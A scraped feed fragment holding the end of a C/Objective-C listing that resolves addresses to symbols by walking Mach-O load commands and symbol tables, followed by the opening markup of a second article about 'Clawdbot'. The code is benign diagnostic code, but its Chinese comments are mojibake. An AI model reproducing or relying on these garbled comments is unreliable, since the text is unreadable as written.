    <span class="hljs-comment">// å¦‚æœæ²¡æ‰¾åˆ°å¯¹åº”çš„é•œåƒï¼Œè¿”å›false</span>
    <span class="hljs-keyword">if</span>(idx == UINT_MAX) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// è·å–é•œåƒçš„Mach-Oå¤´éƒ¨</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mach_header</span>* <span class="hljs-title">header</span> =</span> _dyld_get_image_header(idx);
    <span class="hljs-comment">// è·å–é•œåƒçš„è™šæ‹Ÿå†…å­˜åœ°å€åç§»ï¼ˆASLRåœ°å€éšæœºåŒ–åç§»ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> imageVMAddrSlide = (<span class="hljs-type">uintptr_t</span>)_dyld_get_image_vmaddr_slide(idx);
    <span class="hljs-comment">// è®¡ç®—å»é™¤åç§»åçš„åœ°å€ï¼ˆæ–‡ä»¶ä¸­çš„åŸå§‹åœ°å€ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> addressWithSlide = address - imageVMAddrSlide;
    <span class="hljs-comment">// è·å–æ®µåŸºåœ°å€ï¼ˆç”¨äºå®šä½ç¬¦å·è¡¨åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼‰</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> segmentBase = bs_segmentBaseOfImageIndex(idx) + imageVMAddrSlide;
    <span class="hljs-comment">// å¦‚æœæ®µåŸºåœ°å€ä¸º0ï¼Œè¿”å›false</span>
    <span class="hljs-keyword">if</span>(segmentBase == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// å¡«å……æ–‡ä»¶åå’ŒåŸºåœ°å€ä¿¡æ¯</span>
    info-&gt;dli_fname = _dyld_get_image_name(idx);
    info-&gt;dli_fbase = (<span class="hljs-type">void</span>*)header;
    
    <span class="hljs-comment">// æŸ¥æ‰¾ç¬¦å·è¡¨å¹¶è·å–æœ€æ¥è¿‘è¯¥åœ°å€çš„ç¬¦å·</span>
    <span class="hljs-comment">// æœ€ä½³åŒ¹é…çš„ç¬¦å·è¡¨é¡¹</span>
    <span class="hljs-type">const</span> BS_NLIST* bestMatch = <span class="hljs-literal">NULL</span>;
    <span class="hljs-comment">// æœ€å°è·ç¦»åˆå§‹åŒ–ä¸ºæœ€å¤§å€¼</span>
    <span class="hljs-type">uintptr_t</span> bestDistance = ULONG_MAX;
    <span class="hljs-comment">// è·å–Mach-Oå¤´éƒ¨åçš„ç¬¬ä¸€ä¸ªåŠ è½½å‘½ä»¤åœ°å€</span>
    <span class="hljs-type">uintptr_t</span> cmdPtr = bs_firstCmdAfterHeader(header);
    <span class="hljs-comment">// å¦‚æœå‘½ä»¤æŒ‡é’ˆä¸º0ï¼Œè¯´æ˜å¤´éƒ¨æŸå</span>
    <span class="hljs-keyword">if</span>(cmdPtr == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    <span class="hljs-comment">// éå†æ‰€æœ‰åŠ è½½å‘½ä»¤</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint32_t</span> iCmd = <span class="hljs-number">0</span>; iCmd &lt; header-&gt;ncmds; iCmd++) {
        <span class="hljs-comment">// å½“å‰åŠ è½½å‘½ä»¤</span>
        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">load_command</span>* <span class="hljs-title">loadCmd</span> =</span> (<span class="hljs-keyword">struct</span> load_command*)cmdPtr;
        <span class="hljs-comment">// å¦‚æœæ˜¯ç¬¦å·è¡¨å‘½ä»¤</span>
        <span class="hljs-keyword">if</span>(loadCmd-&gt;cmd == LC_SYMTAB) {
            <span class="hljs-comment">// è½¬æ¢ä¸ºç¬¦å·è¡¨å‘½ä»¤ç»“æ„ä½“</span>
            <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">symtab_command</span>* <span class="hljs-title">symtabCmd</span> =</span> (<span class="hljs-keyword">struct</span> symtab_command*)cmdPtr;
            <span class="hljs-comment">// è®¡ç®—ç¬¦å·è¡¨åœ¨å†…å­˜ä¸­çš„åœ°å€</span>
            <span class="hljs-type">const</span> BS_NLIST* symbolTable = (BS_NLIST*)(segmentBase + symtabCmd-&gt;symoff);
            <span class="hljs-comment">// è®¡ç®—å­—ç¬¦ä¸²è¡¨åœ¨å†…å­˜ä¸­çš„åœ°å€</span>
            <span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> stringTable = segmentBase + symtabCmd-&gt;stroff;
            
            <span class="hljs-comment">// éå†ç¬¦å·è¡¨ä¸­çš„æ‰€æœ‰ç¬¦å·</span>
            <span class="hljs-keyword">for</span>(<span class="hljs-type">uint32_t</span> iSym = <span class="hljs-number">0</span>; iSym &lt; symtabCmd-&gt;nsyms; iSym++) {
                <span class="hljs-comment">// å¦‚æœn_valueä¸º0ï¼Œè¯´æ˜è¯¥ç¬¦å·å¼•ç”¨å¤–éƒ¨å¯¹è±¡ï¼Œè·³è¿‡</span>
                <span class="hljs-keyword">if</span>(symbolTable[iSym].n_value != <span class="hljs-number">0</span>) {
                    <span class="hljs-comment">// ç¬¦å·çš„åŸºåœ°å€</span>
                    <span class="hljs-type">uintptr_t</span> symbolBase = symbolTable[iSym].n_value;
                    <span class="hljs-comment">// è®¡ç®—åœ°å€ä¸ç¬¦å·åŸºåœ°å€çš„è·ç¦»</span>
                    <span class="hljs-type">uintptr_t</span> currentDistance = addressWithSlide - symbolBase;
                    <span class="hljs-comment">// å¦‚æœåœ°å€å¤§äºç­‰äºç¬¦å·åŸºåœ°å€ï¼Œä¸”è·ç¦»å°äºç­‰äºå½“å‰æœ€ä½³è·ç¦»</span>
                    <span class="hljs-keyword">if</span>((addressWithSlide &gt;= symbolBase) &amp;&amp;
                       (currentDistance &lt;= bestDistance)) {
                        <span class="hljs-comment">// æ›´æ–°æœ€ä½³åŒ¹é…</span>
                        bestMatch = symbolTable + iSym;
                        <span class="hljs-comment">// æ›´æ–°æœ€å°è·ç¦»</span>
                        bestDistance = currentDistance;
                    }
                }
            }
            <span class="hljs-comment">// å¦‚æœæ‰¾åˆ°äº†åŒ¹é…çš„ç¬¦å·</span>
            <span class="hljs-keyword">if</span>(bestMatch != <span class="hljs-literal">NULL</span>) {
                <span class="hljs-comment">// å¡«å……ç¬¦å·åœ°å€ï¼ˆéœ€è¦åŠ ä¸ŠASLRåç§»ï¼‰</span>
                info-&gt;dli_saddr = (<span class="hljs-type">void</span>*)(bestMatch-&gt;n_value + imageVMAddrSlide);
                <span class="hljs-comment">// ä»å­—ç¬¦ä¸²è¡¨ä¸­è·å–ç¬¦å·åç§°</span>
                info-&gt;dli_sname = (<span class="hljs-type">char</span>*)((<span class="hljs-type">intptr_t</span>)stringTable + (<span class="hljs-type">intptr_t</span>)bestMatch-&gt;n_un.n_strx);
                <span class="hljs-comment">// å¦‚æœç¬¦å·åä»¥ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆC/C++ç¬¦å·çš„å‘½åçº¦å®šï¼‰ï¼Œè·³è¿‡ä¸‹åˆ’çº¿</span>
                <span class="hljs-keyword">if</span>(*info-&gt;dli_sname == <span class="hljs-string">'_'</span>) {
                    info-&gt;dli_sname++;
                }
                <span class="hljs-comment">// å¦‚æœç¬¦å·åœ°å€ç­‰äºæ–‡ä»¶åŸºåœ°å€ä¸”ç±»å‹ä¸º3ï¼Œè¯´æ˜ç¬¦å·å·²è¢«å‰¥ç¦»</span>
                <span class="hljs-keyword">if</span>(info-&gt;dli_saddr == info-&gt;dli_fbase &amp;&amp; bestMatch-&gt;n_type == <span class="hljs-number">3</span>) {
                    info-&gt;dli_sname = <span class="hljs-literal">NULL</span>;
                }
                <span class="hljs-comment">// æ‰¾åˆ°ç¬¦å·åè·³å‡ºå¾ªç¯</span>
                <span class="hljs-keyword">break</span>;
            }
        }
        <span class="hljs-comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåŠ è½½å‘½ä»¤</span>
        cmdPtr += loadCmd-&gt;cmdsize;
    }
    <span class="hljs-comment">// è¿”å›æˆåŠŸ</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-comment">// è·å–Mach-Oå¤´éƒ¨åçš„ç¬¬ä¸€ä¸ªåŠ è½½å‘½ä»¤åœ°å€</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_firstCmdAfterHeader</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> mach_header* <span class="hljs-type">const</span> header)</span> {
    <span class="hljs-comment">// æ ¹æ®é­”æ•°åˆ¤æ–­Mach-Oæ–‡ä»¶çš„ç±»å‹å’Œå­—èŠ‚åº</span>
    <span class="hljs-keyword">switch</span>(header-&gt;magic) {
        <span class="hljs-keyword">case</span> MH_MAGIC:    <span class="hljs-comment">// 32ä½å°ç«¯åº</span>
        <span class="hljs-keyword">case</span> MH_CIGAM:    <span class="hljs-comment">// 32ä½å¤§ç«¯åº</span>
            <span class="hljs-comment">// 32ä½å¤´éƒ¨åç›´æ¥è·ŸåŠ è½½å‘½ä»¤ï¼ˆå¤´éƒ¨å¤§å°ä¸ºmach_headerï¼‰</span>
            <span class="hljs-keyword">return</span> (<span class="hljs-type">uintptr_t</span>)(header + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">case</span> MH_MAGIC_64: <span class="hljs-comment">// 64ä½å°ç«¯åº</span>
        <span class="hljs-keyword">case</span> MH_CIGAM_64: <span class="hljs-comment">// 64ä½å¤§ç«¯åº</span>
            <span class="hljs-comment">// 64ä½å¤´éƒ¨åç›´æ¥è·ŸåŠ è½½å‘½ä»¤ï¼ˆå¤´éƒ¨å¤§å°ä¸ºmach_header_64ï¼‰</span>
            <span class="hljs-keyword">return</span> (<span class="hljs-type">uintptr_t</span>)(((<span class="hljs-keyword">struct</span> mach_header_64*)header) + <span class="hljs-number">1</span>);
        <span class="hljs-keyword">default</span>:
            <span class="hljs-comment">// æœªçŸ¥é­”æ•°ï¼Œå¤´éƒ¨æŸå</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  <span class="hljs-comment">// Header is corrupt</span>
    }
}

<span class="hljs-comment">// æŸ¥æ‰¾åŒ…å«æŒ‡å®šåœ°å€çš„é•œåƒç´¢å¼•</span>
<span class="hljs-comment">// éå†æ‰€æœ‰å·²åŠ è½½çš„åŠ¨æ€åº“ï¼Œæ‰¾åˆ°åŒ…å«è¯¥åœ°å€çš„é‚£ä¸€ä¸ª</span>
<span class="hljs-type">uint32_t</span> <span class="hljs-title function_">bs_imageIndexContainingAddress</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uintptr_t</span> address)</span> {
    <span class="hljs-comment">// è·å–å½“å‰è¿›ç¨‹åŠ è½½çš„é•œåƒï¼ˆåŠ¨æ€åº“/å¯æ‰§è¡Œæ–‡ä»¶ï¼‰æ•°é‡</span>
    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> imageCount = _dyld_image_count();
    <span class="hljs-comment">// Mach-Oå¤´éƒ¨æŒ‡é’ˆ</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mach_header</span>* <span class="hljs-title">header</span> =</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// éå†æ‰€æœ‰é•œåƒ</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint32_t</span> iImg = <span class="hljs-number">0</span>; iImg &lt; imageCount; iImg++) {
        <span class="hljs-comment">// è·å–é•œåƒçš„å¤´éƒ¨</span>
        header = _dyld_get_image_header(iImg);
        <span class="hljs-comment">// å¦‚æœå¤´éƒ¨æœ‰æ•ˆ</span>
        <span class="hljs-keyword">if</span>(header != <span class="hljs-literal">NULL</span>) {
            <span class="hljs-comment">// æŸ¥æ‰¾åŒ…å«è¯¥åœ°å€çš„æ®µå‘½ä»¤</span>
            <span class="hljs-comment">// è®¡ç®—å»é™¤ASLRåç§»åçš„åœ°å€</span>
            <span class="hljs-type">uintptr_t</span> addressWSlide = address - (<span class="hljs-type">uintptr_t</span>)_dyld_get_image_vmaddr_slide(iImg);
            <span class="hljs-comment">// è·å–ç¬¬ä¸€ä¸ªåŠ è½½å‘½ä»¤çš„åœ°å€</span>
            <span class="hljs-type">uintptr_t</span> cmdPtr = bs_firstCmdAfterHeader(header);
            <span class="hljs-comment">// å¦‚æœå‘½ä»¤æŒ‡é’ˆæ— æ•ˆï¼Œè·³è¿‡è¿™ä¸ªé•œåƒ</span>
            <span class="hljs-keyword">if</span>(cmdPtr == <span class="hljs-number">0</span>) {
                <span class="hljs-keyword">continue</span>;
            }
            <span class="hljs-comment">// éå†è¯¥é•œåƒçš„æ‰€æœ‰åŠ è½½å‘½ä»¤</span>
            <span class="hljs-keyword">for</span>(<span class="hljs-type">uint32_t</span> iCmd = <span class="hljs-number">0</span>; iCmd &lt; header-&gt;ncmds; iCmd++) {
                <span class="hljs-comment">// å½“å‰åŠ è½½å‘½ä»¤</span>
                <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">load_command</span>* <span class="hljs-title">loadCmd</span> =</span> (<span class="hljs-keyword">struct</span> load_command*)cmdPtr;
                <span class="hljs-comment">// å¦‚æœæ˜¯32ä½æ®µå‘½ä»¤</span>
                <span class="hljs-keyword">if</span>(loadCmd-&gt;cmd == LC_SEGMENT) {
                    <span class="hljs-comment">// è½¬æ¢ä¸º32ä½æ®µå‘½ä»¤ç»“æ„ä½“</span>
                    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment_command</span>* <span class="hljs-title">segCmd</span> =</span> (<span class="hljs-keyword">struct</span> segment_command*)cmdPtr;
                    <span class="hljs-comment">// æ£€æŸ¥åœ°å€æ˜¯å¦åœ¨è¯¥æ®µçš„è™šæ‹Ÿåœ°å€èŒƒå›´å†…</span>
                    <span class="hljs-keyword">if</span>(addressWSlide &gt;= segCmd-&gt;vmaddr &amp;&amp;
                       addressWSlide &lt; segCmd-&gt;vmaddr + segCmd-&gt;vmsize) {
                        <span class="hljs-comment">// æ‰¾åˆ°äº†ï¼Œè¿”å›é•œåƒç´¢å¼•</span>
                        <span class="hljs-keyword">return</span> iImg;
                    }
                }
                <span class="hljs-comment">// å¦‚æœæ˜¯64ä½æ®µå‘½ä»¤</span>
                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(loadCmd-&gt;cmd == LC_SEGMENT_64) {
                    <span class="hljs-comment">// è½¬æ¢ä¸º64ä½æ®µå‘½ä»¤ç»“æ„ä½“</span>
                    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> segment_command_64* segCmd = (<span class="hljs-keyword">struct</span> segment_command_64*)cmdPtr;
                    <span class="hljs-comment">// æ£€æŸ¥åœ°å€æ˜¯å¦åœ¨è¯¥æ®µçš„è™šæ‹Ÿåœ°å€èŒƒå›´å†…</span>
                    <span class="hljs-keyword">if</span>(addressWSlide &gt;= segCmd-&gt;vmaddr &amp;&amp;
                       addressWSlide &lt; segCmd-&gt;vmaddr + segCmd-&gt;vmsize) {
                        <span class="hljs-comment">// æ‰¾åˆ°äº†ï¼Œè¿”å›é•œåƒç´¢å¼•</span>
                        <span class="hljs-keyword">return</span> iImg;
                    }
                }
                <span class="hljs-comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåŠ è½½å‘½ä»¤</span>
                cmdPtr += loadCmd-&gt;cmdsize;
            }
        }
    }
    <span class="hljs-comment">// æ²¡æœ‰æ‰¾åˆ°åŒ…å«è¯¥åœ°å€çš„é•œåƒï¼Œè¿”å›UINT_MAXè¡¨ç¤ºå¤±è´¥</span>
    <span class="hljs-keyword">return</span> UINT_MAX;
}

<span class="hljs-comment">// è·å–æŒ‡å®šé•œåƒç´¢å¼•çš„æ®µåŸºåœ°å€</span>
<span class="hljs-comment">// é€šè¿‡æŸ¥æ‰¾__LINKEDITæ®µæ¥è®¡ç®—æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„æ˜ å°„åŸºåœ°å€</span>
<span class="hljs-type">uintptr_t</span> <span class="hljs-title function_">bs_segmentBaseOfImageIndex</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> idx)</span> {
    <span class="hljs-comment">// è·å–é•œåƒçš„Mach-Oå¤´éƒ¨</span>
    <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mach_header</span>* <span class="hljs-title">header</span> =</span> _dyld_get_image_header(idx);
    
    <span class="hljs-comment">// æŸ¥æ‰¾æ®µå‘½ä»¤å¹¶è¿”å›æ–‡ä»¶é•œåƒåœ°å€</span>
    <span class="hljs-comment">// è·å–ç¬¬ä¸€ä¸ªåŠ è½½å‘½ä»¤çš„åœ°å€</span>
    <span class="hljs-type">uintptr_t</span> cmdPtr = bs_firstCmdAfterHeader(header);
    <span class="hljs-comment">// å¦‚æœå‘½ä»¤æŒ‡é’ˆæ— æ•ˆï¼Œè¿”å›0</span>
    <span class="hljs-keyword">if</span>(cmdPtr == <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }
    <span class="hljs-comment">// éå†æ‰€æœ‰åŠ è½½å‘½ä»¤</span>
    <span class="hljs-keyword">for</span>(<span class="hljs-type">uint32_t</span> i = <span class="hljs-number">0</span>;i &lt; header-&gt;ncmds; i++) {
        <span class="hljs-comment">// å½“å‰åŠ è½½å‘½ä»¤</span>
        <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">load_command</span>* <span class="hljs-title">loadCmd</span> =</span> (<span class="hljs-keyword">struct</span> load_command*)cmdPtr;
        <span class="hljs-comment">// å¦‚æœæ˜¯32ä½æ®µå‘½ä»¤</span>
        <span class="hljs-keyword">if</span>(loadCmd-&gt;cmd == LC_SEGMENT) {
            <span class="hljs-comment">// è½¬æ¢ä¸º32ä½æ®µå‘½ä»¤ç»“æ„ä½“</span>
            <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">segment_command</span>* <span class="hljs-title">segmentCmd</span> =</span> (<span class="hljs-keyword">struct</span> segment_command*)cmdPtr;
            <span class="hljs-comment">// æŸ¥æ‰¾__LINKEDITæ®µï¼ˆåŒ…å«ç¬¦å·è¡¨ã€å­—ç¬¦ä¸²è¡¨ç­‰é“¾æ¥ä¿¡æ¯ï¼‰</span>
            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(segmentCmd-&gt;segname, SEG_LINKEDIT) == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// è¿”å›æ®µåŸºåœ°å€ï¼šè™šæ‹Ÿå†…å­˜åœ°å€ - æ–‡ä»¶åç§»</span>
                <span class="hljs-comment">// è¿™ä¸ªå€¼ç”¨äºå°†æ–‡ä»¶åç§»è½¬æ¢ä¸ºè™šæ‹Ÿå†…å­˜åœ°å€</span>
                <span class="hljs-keyword">return</span> segmentCmd-&gt;vmaddr - segmentCmd-&gt;fileoff;
            }
        }
        <span class="hljs-comment">// å¦‚æœæ˜¯64ä½æ®µå‘½ä»¤</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(loadCmd-&gt;cmd == LC_SEGMENT_64) {
            <span class="hljs-comment">// è½¬æ¢ä¸º64ä½æ®µå‘½ä»¤ç»“æ„ä½“</span>
            <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> segment_command_64* segmentCmd = (<span class="hljs-keyword">struct</span> segment_command_64*)cmdPtr;
            <span class="hljs-comment">// æŸ¥æ‰¾__LINKEDITæ®µ</span>
            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strcmp</span>(segmentCmd-&gt;segname, SEG_LINKEDIT) == <span class="hljs-number">0</span>) {
                <span class="hljs-comment">// è¿”å›æ®µåŸºåœ°å€ï¼šè™šæ‹Ÿå†…å­˜åœ°å€ - æ–‡ä»¶åç§»</span>
                <span class="hljs-keyword">return</span> (<span class="hljs-type">uintptr_t</span>)(segmentCmd-&gt;vmaddr - segmentCmd-&gt;fileoff);
            }
        }
        <span class="hljs-comment">// ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªåŠ è½½å‘½ä»¤</span>
        cmdPtr += loadCmd-&gt;cmdsize;
    }
    <span class="hljs-comment">// æ²¡æœ‰æ‰¾åˆ°__LINKEDITæ®µï¼Œè¿”å›0</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

@end

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Clawdbot ä¸ºä»€ä¹ˆçªç„¶åˆ·çˆ†ç¡…è°·ï¼Ÿå®ƒä¸æ˜¯ä¸‹ä¸€ä¸ª ChatGPTï¼Œè€Œæ˜¯å¦ä¸€ç§å¯èƒ½]]></title>    <link>https://juejin.cn/post/7600318091831967771</link>    <guid>https://juejin.cn/post/7600318091831967771</guid>    <pubDate>2026-01-29T05:45:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600318091831967771" data-draft-id="7600489282822979634" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Clawdbot ä¸ºä»€ä¹ˆçªç„¶åˆ·çˆ†ç¡…è°·ï¼Ÿå®ƒä¸æ˜¯ä¸‹ä¸€ä¸ª ChatGPTï¼Œè€Œæ˜¯å¦ä¸€ç§å¯èƒ½"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2026-01-29T05:45:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="IvanCodes"/> <meta itemprop="url" content="https://juejin.cn/user/2376493931447594"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Clawdbot ä¸ºä»€ä¹ˆçªç„¶åˆ·çˆ†ç¡…è°·ï¼Ÿå®ƒä¸æ˜¯ä¸‹ä¸€ä¸ª ChatGPTï¼Œè€Œæ˜¯å¦ä¸€ç§å¯èƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2376493931447594/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IvanCodes
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:45:26.000Z" title="Thu Jan 29 2026 05:45:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D